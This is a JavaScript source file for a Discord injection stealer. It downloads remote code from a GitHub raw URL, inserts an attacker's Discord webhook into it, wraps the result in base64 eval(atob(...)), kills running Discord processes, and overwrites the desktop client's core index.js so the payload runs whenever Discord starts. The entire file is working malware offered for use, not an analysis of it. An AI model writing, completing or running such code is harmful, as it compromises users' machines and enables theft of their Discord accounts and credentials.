const fs = require('fs');
const path = require('path');
const os = require('os');
const axios = require('axios');
const { execFile } = require('child_process');

const H00K3_URL = "%WEBHOOK%";

class Injection {
  constructor(webhook) {
    const match = webhook.match(/\/api\/webhooks\/\d+\/[\w-]+/);
    if (!match) return;

    this.webhook = "https://discord.com" + match[0];
    this.appdata = process.env.LOCALAPPDATA;

    this.discordDirs = [
      path.join(this.appdata, 'Discord'),
      path.join(this.appdata, 'DiscordCanary'),
      path.join(this.appdata, 'DiscordPTB'),
      path.join(this.appdata, 'DiscordDevelopment')
    ];

    this.init();
  }

  async init() {
    let code;
    try {
      const res = await axios.get(
        'https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/b4ttyxac2un.js'
      );
      code = res.data;
    } catch {
      return;
    }

    if (!code.trim()) return;

    const replacedCode = code.replace('%WEBHOOK%', this.webhook);
    const b64 = Buffer.from(replacedCode, 'utf-8').toString('base64');
    const obfuscated = `eval(atob("${b64}"));`;

    try {
      const psList = (await import('ps-list')).default;
      const processes = await psList();
      for (const proc of processes) {
        if (proc.name.toLowerCase().includes('discord')) {
          process.kill(proc.pid);
        }
      }
    } catch {}

    for (const dir of this.discordDirs) {
      if (!fs.existsSync(dir)) continue;

      const coreData = this.getCore(dir);
      if (!coreData) continue;

      const [corePath] = coreData;
      const indexPath = path.join(corePath, 'index.js');

      try {
        fs.writeFileSync(indexPath, obfuscated, 'utf-8');
      } catch {
        continue;
      }

      this.startDiscord(dir);
    }
  }

  getCore(dir) {
    const files = fs.readdirSync(dir);
    for (const file of files) {
      if (/app-/.test(file)) {
        const modulesPath = path.join(dir, file, 'modules');
        if (!fs.existsSync(modulesPath)) continue;

        const modules = fs.readdirSync(modulesPath);
        for (const mod of modules) {
          if (/discord_desktop_core-/.test(mod)) {
            const corePath = path.join(modulesPath, mod, 'discord_desktop_core');
            if (fs.existsSync(path.join(corePath, 'index.js'))) {
              return [corePath, mod];
            }
          }
        }
      }
    }
    return null;
  }

  startDiscord(dir) {
    const updateExe = path.join(dir, 'Update.exe');
    const exeName = path.basename(dir) + '.exe';

    const files = fs.readdirSync(dir);
    for (const file of files) {
      if (/app-/.test(file)) {
        const appPath = path.join(dir, file);
        if (fs.existsSync(path.join(appPath, 'modules'))) {
          const exePath = path.join(appPath, exeName);
          if (fs.existsSync(exePath)) {
            try {
              execFile(updateExe, ['--processStart', exeName]);
            } catch {}
          }
        }
      }
    }
  }
}

new Injection(H00K3_URL);
